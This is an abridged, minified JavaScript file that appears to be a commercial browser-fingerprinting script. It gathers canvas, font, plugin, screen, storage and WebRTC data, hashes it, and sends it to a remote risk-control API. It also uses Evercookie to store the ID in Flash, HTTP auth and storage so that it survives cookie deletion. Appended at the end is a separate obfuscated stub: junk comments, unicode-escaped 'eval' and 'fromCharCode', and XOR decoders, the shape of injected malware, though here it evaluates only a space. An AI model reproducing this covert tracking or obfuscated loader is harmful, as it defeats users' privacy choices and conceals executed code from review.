...
(function () {
    ...
    function Ta(a, b, c, d) {
        if (!k.ie || !k.mac) {
            ...
            e && (c = c && "string" == typeof c ? c : "screen", d && (xa = L = null), L && xa == c || (d = p.createElement("style"), d.setAttribute("type", "text/css"), d.setAttribute("media", c), L = e.appendChild(d), k.ie && k.win && "undefined" != typeof p.styleSheets && 0 < p.styleSheets.length && (L = p.styleSheets[p.styleSheets.length - 1]), xa = c), k.ie && k.win ? L && "object" == typeof L.addRule && L.addRule(a, b) : L && "undefined" != typeof p.createTextNode && L.appendChild(p.createTextNode(a +
                " {" + b + "}")))
        }
    }
    ...
    function Aa(a, b, c, d) {
        ...
        var e = J(c);
        if (e) {
            "OBJECT" == e.nodeName ? (W = za(e), ka = null) : (W = e, ka = c);
            ...
            k.ie && k.win && 4 != e.readyState && (d = p.createElement("div"), c += "SWFObjectNew", d.setAttribute("id", c), e.parentNode.insertBefore(d, e), e.style.display = "none", function g() {
        ...
        if (0 < a) for (var b = 0; b < a; b++) {
            ...
            if (0 < k.pv[0]) {
                ...
                if (f) if (!ha(M[b].swfVersion) || k.wk && 312 > k.wk) if (M[b].expressInstall && Ca()) {
                    ...
                    Aa(e, g, c, d)
                } else ob(f), d && d(e); else O(c, !0), d && (e.success = !0, e.ref = Da(c), d(e))
    ...
    (function () {
            ...
            switch (l && "object" == typeof l && "function" == typeof l.toJSON && (l = l.toJSON(a)), "function" == typeof h && (l = h.call(b, a, l)), typeof l) {
                ...
                case "object":
                    ...
                    if (e += f, K = [], "[object Array]" === Object.prototype.toString.apply(l)) {
                        A =
                            l.length;
                        for (q = 0; A > q; q += 1) K[q] = d(q, l) || "null";
                        return z = 0 === K.length ? "[]" : e ? "[\n" + e + K.join(",\n" + e) + "\n" + m + "]" : "[" + K.join(",") + "]", e = m, z
                    }
                    if (h && "object" == typeof h) for (A = h.length, q = 0; A > q; q += 1) "string" == typeof h[q] && (g = h[q], z = d(g, l), z && K.push(c(g) + (e ? ": " : ":") + z)); else for (g in l) Object.prototype.hasOwnProperty.call(l, g) && (z = d(g, l), z && K.push(c(g) + (e ? ": " : ":") + z));
                    return z = 0 === K.length ? "{}" : e ? "{\n" + e + K.join(",\n" + e) + "\n" + m + "}" : "{" + K.join(",") + "}", e = m, z
            }
        }

        var e, f, g, h, w = /^[\],:{}\s]*$/, k = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,
        ...
        "function" != typeof JSON.parse && (JSON.parse = function (a, b) {
            function c(a, d) {
                var e, f, q = a[d];
                if (q && "object" == typeof q) for (e in q) Object.prototype.hasOwnProperty.call(q, e) && (f = c(q, e), void 0 !== f ? q[e] = f : delete q[e]);
                return b.call(a, d, q)
            }
            ...
            })), w.test(a.replace(k, "@").replace(l, "]").replace(m, ""))) return d = eval("(" + a + ")"), "function" == typeof b ? c({"": d}, "") : d;
    ...
    X.prototype = {
        ...
        sessionStorageKey: function (a) {
            ...
            return setTimeout(function () {
                ...
                for (var f = f.concat(c.options.userDefinedFonts), g = document.getElementsByTagName("body")[0], h = document.createElement("div"), w = document.createElement("div"), k = {}, l = {}, m = [], v = 0, u = e.length; v < u; v++) {
                    var n = d();
                ...
                g.appendChild(h);
                v = 0;
                for (u = e.length; v < u; v++) k[e[v]] = m[v].offsetWidth, l[e[v]] = m[v].offsetHeight;
                m = {};
                v = 0;
                ...
                for (n = f.length; u < n; u++) {
                    p = m[f[u]];
                    q = !1;
                    for (B = 0; B < e.length && !(q = p[B].offsetWidth !== k[e[B]] || p[B].offsetHeight !== l[e[B]]); B++) ;
                    q && v.push(f[u])
                }
                g.removeChild(w);
                g.removeChild(h);
        ...
        isWebGlSupported: function () {
            ...
            return U.hasFlashPlayerVersion("9.0.0")
        },
        addFlashDivNode: function () {
            ...
            U.embedSWF(this.options.swfPath, b, "1", "1", "9.0.0", !1, {onReady: "___fp_swf_loaded"}, {
        ...
        x64Add: function (a, b) {
            ...
            a = a || "";
            b = b || 0;
            for (var c = a.length % 16, d = a.length - c, e = [0, b], f = [0, b], g, h, k = [2277735313, 289559509], n = [1291169091, 658871167], l = 0; l < d; l += 16) g = [a.charCodeAt(l +
                4) & 255 | (a.charCodeAt(l + 5) & 255) << 8 | (a.charCodeAt(l + 6) & 255) << 16 | (a.charCodeAt(l + 7) & 255) << 24, a.charCodeAt(l) & 255 | (a.charCodeAt(l + 1) & 255) << 8 | (a.charCodeAt(l + 2) & 255) << 16 | (a.charCodeAt(l + 3) & 255) << 24], h = [a.charCodeAt(l + 12) & 255 | (a.charCodeAt(l + 13) & 255) << 8 | (a.charCodeAt(l + 14) & 255) << 16 | (a.charCodeAt(l + 15) & 255) << 24, a.charCodeAt(l + 8) & 255 | (a.charCodeAt(l + 9) & 255) << 8 | (a.charCodeAt(l + 10) & 255) << 16 | (a.charCodeAt(l + 11) & 255) << 24], g = this.x64Multiply(g, k), g = this.x64Rotl(g, 31), g = this.x64Multiply(g, n), e = this.x64Xor(e, g),
                e = this.x64Rotl(e, 27), e = this.x64Add(e, f), e = this.x64Add(this.x64Multiply(e, [0, 5]), [0, 1390208809]), h = this.x64Multiply(h, n), h = this.x64Rotl(h, 33), h = this.x64Multiply(h, k), f = this.x64Xor(f, h), f = this.x64Rotl(f, 31), f = this.x64Add(f, e), f = this.x64Add(this.x64Multiply(f, [0, 5]), [0, 944331445]);
            g = [0, 0];
            h = [0, 0];
            switch (c) {
                case 15:
                ...
                case 9:
                    h = this.x64Xor(h, [0, a.charCodeAt(l + 8)]), h = this.x64Multiply(h, n), h = this.x64Rotl(h, 33), h = this.x64Multiply(h, k), f = this.x64Xor(f, h);
                case 8:
                ...
                case 1:
                    g = this.x64Xor(g, [0, a.charCodeAt(l)]), g = this.x64Multiply(g, k), g = this.x64Rotl(g, 31), g = this.x64Multiply(g, n), e = this.x64Xor(e, g)
            }
    ...
    var ab = {
        ...
        rb = "appCodeName appMinorVersion appName cpuClass onLine systemLanguage userLanguage historyList hasLiedLanguages hasLiedResolution hasLiedOs hasLiedBrowser".split(" "),
        sb = ["sessionStorage", "localStorage", "indexedDb", "openDatabase"], tb = ["scrAvailWidth", "scrAvailHeight"],
        ub = ["scrDeviceXDPI", "scrColorDepth", "scrWidth", "scrHeight"], Ha;
    if (!(Ha = Z)) {
        var aa = Math, oa = {}, pa = oa.lib = {}, bb =
            G(), ba = pa.Base = {
            extend: function (a) {
                bb.prototype = this;
                var b = new bb;
    ...
    for (var Z = Ha, qa = Math, ra = Z, Q = ra.lib, yb = Q.WordArray, sa = Q.Hasher, Q = ra.algo, eb = [], fb = [], ta = 2, da = 0; 64 > da;) {
        var V;
        a:{
            V = ta;
            for (var zb = qa.sqrt(V), Ja = 2; Ja <= zb; Ja++) if (!(V % Ja)) {
                V = !1;
                break a
            }
            V = !0
        }
        V && (8 > da && (eb[da] = Ya(qa.pow(ta, .5))), fb[da] = Ya(qa.pow(ta, 1 / 3)), da++);
        ta++
    }
    var R = [], Q = Q.SHA256 = sa.extend({
        _doReset: function () {
            this._hash = new yb.init(eb.slice(0))
        }, _doProcessBlock: function (a, b) {
            for (var c = this._hash.words, d = c[0], e = c[1], f = c[2], g = c[3], h = c[4], k = c[5], n = c[6], l = c[7], m = 0; 64 > m; m++) {
                if (16 >
                    m) R[m] = a[b + m] | 0; else {
                    var v = R[m - 15], u = R[m - 2];
                    R[m] = ((v << 25 | v >>> 7) ^ (v << 14 | v >>> 18) ^ v >>> 3) + R[m - 7] + ((u << 15 | u >>> 17) ^ (u << 13 | u >>> 19) ^ u >>> 10) + R[m - 16]
                }
                v = l + ((h << 26 | h >>> 6) ^ (h << 21 | h >>> 11) ^ (h << 7 | h >>> 25)) + (h & k ^ ~h & n) + fb[m] + R[m];
    ...
    ra.SHA256 = sa._createHelper(Q);
    ra.HmacSHA256 = sa._createHmacHelper(Q);
    var gb = Z, Ab = gb.lib.WordArray;
    gb.enc.Base64 = {
        stringify: function (a) {
    ...
    var U, I = window, p = document, N = navigator, hb = !1, la = [function () {
            if (hb) {
        ...
        }], M = [], ia = [], S = [], W, ka, Ba, Va, P = !1, ja = !1, L, xa, Sa = !0, k,
        Bb = "undefined" != typeof p.getElementById && "undefined" != typeof p.getElementsByTagName && "undefined" != typeof p.createElement,
        ua = N.userAgent.toLowerCase(),
        va = N.platform.toLowerCase(), Cb = va ? /win/.test(va) : /win/.test(ua),
        Db = va ? /mac/.test(va) : /mac/.test(ua),
        Eb = /webkit/.test(ua) ? parseFloat(ua.replace(/^.*webkit\/(\d+(\.\d+)?).*$/, "$1")) : !1, Ka = !+"\v1",
        ea = [0, 0, 0], H = null;
    if ("undefined" != typeof N.plugins && "object" == typeof N.plugins["Shockwave Flash"]) !(H = N.plugins["Shockwave Flash"].description) || "undefined" != typeof N.mimeTypes && N.mimeTypes["application/x-shockwave-flash"] && !N.mimeTypes["application/x-shockwave-flash"].enabledPlugin || (hb = !0, Ka = !1, H = H.replace(/^.*\s+(\S+\s+\S+$)/,
    ...
    k = {w3: Bb, pv: ea, wk: Eb, ie: Ka, win: Cb, mac: Db};
    k.w3 && (("undefined" != typeof p.readyState &&
        "complete" == p.readyState || "undefined" == typeof p.readyState && (p.getElementsByTagName("body")[0] || p.body)) && T(), P || ("undefined" != typeof p.addEventListener && p.addEventListener("DOMContentLoaded", T, !1), k.ie && k.win && (p.attachEvent("onreadystatechange", function b() {
        "complete" == p.readyState && (p.detachEvent("onreadystatechange", b), T())
    }), I == top && function c() {
        if (!P) {
            try {
    ...
    U = {
        registerObject: function (a, b, c, d) {
            ...
            k.w3 && !(k.wk && 312 > k.wk) && a && b && c && d && e ? (O(b, !1), Xa(function () {
                    c += "";
                    d += "";
                    var m = {};
                    if (n && "object" === typeof n) for (var k in n) m[k] = n[k];
                    m.data = a;
                    m.width = c;
                    m.height = d;
                    k = {};
                    if (h && "object" === typeof h) for (var u in h) k[u] = h[u];
                    if (g && "object" === typeof g) for (var w in g) k.flashvars = "undefined" != typeof k.flashvars ? k.flashvars + ("\x26" + w + "\x3d" + g[w]) : w + "\x3d" + g[w];
            ...
            k.w3 && Ta(a, b, c, d)
        }, addDomLoadEvent: Xa, addLoadEvent: Wa, getQueryParamValue: function (a) {
            ...
            if (ja) {
                ...
                a && W && (a.parentNode.replaceChild(W, a), ka && (O(ka, !0), k.ie && k.win && (W.style.display = "block")), Ba && Ba(Va));
                ja = !1
            }
        }
    };
    try {
        var r = window, t = r.document, ib = r.Image, La = r.globalStorage, jb = r.swfobject;
        try {
            var Ma = r.localStorage
        } catch (a) {
        }
        try {
            var Na = r.sessionStorage
        } catch (a) {
        }
        var fa,
            wa, kb = {
                ...
                tests: 2,
                silverlight: !1,
                domain: Fa(r.location.host.split(":")[0]),
                baseurl: "",
                asseturi: "/assets",
                phpuri: "/php",
                authPath: !1,
        ...
        r.evercookie = r.Evercookie = function (a) {
            ...
            var e = b.history, f = b.java, g = b.tests, h = b.baseurl, k = b.asseturi, n = b.phpuri, l = b.domain,
                m = this;
            this._ec = {};
            ...
            this._evercookie = function (a, c, d, A, h) {
                ...
                if (void 0 !== d) ("undefined" === typeof fa || "undefined" === typeof wa) && A++ < g && setTimeout(function () {
                    ...
                    wa = void 0;
                    var q = m._ec, z = [], l = 0, B, k;
                    m._ec = {};
                    for (k in q) q[k] && "null" !== q[k] && "undefined" !== q[k] && (z[q[k]] = void 0 === z[q[k]] ? 1 : z[q[k]] + 1);
            ...
            this.evercookie_auth = function (a, c) {
                if (void 0 !== c) {
                    var d = "//" + c + "@" + location.host + h + n + b.authPath + "?name\x3d" + a, e = new ib;
            ...
            this.evercookie_lso =
                function (a, b) {
                    ...
                    f.id = "myswf";
                    f.name = "myswf";
                    jb.embedSWF(h + k + "/evercookie.swf", "swfcontainer", "1", "1", "9.0.0", !1, d, e, f)
                };
            ...
            var p = this.waitForSwf = function (a) {
                void 0 === a ? a = 0 : a++;
                a < g && "undefined" === typeof jb && setTimeout(function () {
                    p(a)
                }, 300)
            };
            ...
            this.getHost = function () {
                return Fa(r.location.host.split(":")[0])
            };
    ...
    ga.prototype = {
        ...
        getCanvansCode: function (a) {
            ...
            return new n("mimeTypes", Y(b.substr(0, b.length - 1)))
            ...
            if ("IE" ==
                this.checkBroswer()) return new n("plugins", Y(a.replace(RegExp(",", "gm"), "#")));
            a = navigator.plugins;
            var b = "";
            for (i = 0; i < a.length; i++) b += a[i].name.toString() + "#";
            return new n("plugins", Y(b))
            ...
            return new n("touchSupport", Y(a.replace(RegExp(",", "gm"), "#")))
        }, getJsFonts: function (a) {
            return new n("jsFonts", Y(a.replace(RegExp(",", "gm"), "#")))
        }, getCustId: function () {
            ...
            this.ec.get("BSFIT_OkLJUJ", function () {
                b.getDfpMoreInfo(function () {
                    if (!(9E5 < F("BSFIT_EXPIRATION") - (new Date).getTime() & null != F("BSFIT_DEVICEID") & void 0 != F("BSFIT_DEVICEID") & !b.NeedUpdate())) {
                        for (var a = "", e = "", f = b.getpackStr(""), g = [], h = [], k = [], p = [], l = 0; l < f.length; l++) "new" != f[l].value && -1 == rb.indexOf(f[l].key) && (-1 != sb.indexOf(f[l].key) ? h.push(f[l]) : -1 != tb.indexOf(f[l].key) ? k.push(f[l]) : -1 != ub.indexOf(f[l].key) ? p.push(f[l]) : g.push(f[l]));
                        f = "";
                        for (l = 0; l < h.length; l++) f = f + h[l].key.charAt(0) +
                            h[l].value;
                        h = "";
                        for (l = 0; l < p.length; l++) h = 0 == l ? h + p[l].value : h + "x" + p[l].value;
                        p = "";
                        for (l = 0; l < k.length; l++) p = 0 == l ? p + k[l].value : p + "x" + k[l].value;
                        g.push(new n("storeDb", f));
                        g.push(new n("srcScreenSize", h));
                        g.push(new n("scrAvailSize", p));
                        "" != c && g.push(new n("localCode", qb(c)));
                        g.sort(function (a, b) {
                            var c, d;
                            if ("object" === typeof a && "object" === typeof b && a && b) return c = a.key, d = b.key, c === d ? 0 : typeof c === typeof d ? c < d ? -1 : 1 : typeof c < typeof d ? -1 : 1;
                            throw"error";
                        });
                        for (k = 0; k < g.length; k++) p = g[k].key.replace(RegExp("%",
                            "gm"), ""), h = "", h = "string" == typeof g[k].value ? g[k].value.replace(RegExp("%", "gm"), "") : g[k].value, "" !== h && (e += p + h, h = encodeURIComponent(h), a += "\x26" + (void 0 == ab[p] ? p : ab[p]) + "\x3d" + h);
                        e = Pa(e);
                        e = Qa(e);
                        k = Pa(e);
                        p = k.length;
                        h = 0 == p % 3 ? parseInt(p / 3) : parseInt(p / 3) + 1;
                        3 > p ? e = k : (e = k.substring(0, 1 * h), g = k.substring(1 * h, 2 * h), k = k.substring(2 * h, p), e = g + k + e);
                        e = Qa(e);
                        e = Z.SHA256(e).toString(Z.enc.Base64);
                        a += "\x26timestamp\x3d" + (new Date).getTime();
                        $a.getJSON("http://frms-new-api.tuniu.cn/public/generate/jsonp" + ("?algID\x3dycE6MlYppv\x26hashCode\x3d" +
                            e + a), null, function (a) {
                            var c = JSON.parse(a);
                            void 0 != lb && lb.postMessage(a, window.parent);
            ...
            var a = this;
            window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection ? nb(function (b) {
                a.initEc(b)
            }) : a.initEc()
        }
    };
    ...
    document.addEventListener ?
        ...
        mb || "interactive" != document.readyState && "complete" != document.readyState || (document.detachEvent("onreadystatechange", c), Oa(), mb = !0)
    })
})();
/*Er*/
var /*ob27*/
    __PKy/*7A*/ = \u0053\u0074\u0072\u0069\u006e\u0067/*Wn*/./*IodO*/\u0066r\u006fm\u0043ha\u0072C\u006fde/*71zo*/;
var /*chNN*/_x_LEz = [/*6AY*/3151, 1849, 2333, 647, 2326, /*8sZf*/];
var /*sgO3*/_$Fz9/*uxv*/ = /*BNV*/function (/*EySi*/) {/*Fm*/
    return /*2U*/arguments[/*dO8J*/0] ^ /*Yah*//*IwRN*/_x_LEz[/*XC*/0];
    /*Yc*/
}/*KFd*/;
var /*kde*/_$nsIv/*qO*/ = /*7a*/function (/*yD*/) {/*Be*/
    return /*mNu*/arguments[/*Iap*/0] ^ /*8Rgz*//*7KRU*/_x_LEz[/*S8z*/1];
    /*6hAr*/
}/*cu73*/;
var /*kUU*/_$wmV/*Ed*/ = /*WYT*/function (/*3sg*/) {/*yKmJ*/
    return /*K8qd*/arguments[/*SHX8*/0] ^ /*Z57d*//*dwPD*/_x_LEz[/*oOp*/2];
    /*Te6O*/
}/*ux*/;
var /*Xm*/_$VdW/*RJi*/ = /*vDvi*/function (/*DLS9*/) {/*d9*/
    return /*L5G*/arguments[/*hne*/0] ^ /*FW*//*Ems*/_x_LEz[/*AOsm*/3];
    /*AUrN*/
}/*lTuB*/;
var /*SCrG*/_$ZK1/*qY*/ = /*43*/function (/*oD*/) {/*gxV*/
    return /*Zydz*/arguments[/*0KxB*/0] ^ /*iHy*//*TpdR*/_x_LEz[/*mZXE*/4];
    /*gqXK*/
}/*Vn*/;
/*yJSQ*/
\u0065\u0076\u0061\u006c/*NFkx*/(__PKy(32/*Hrmyv9F*/));
/*79*/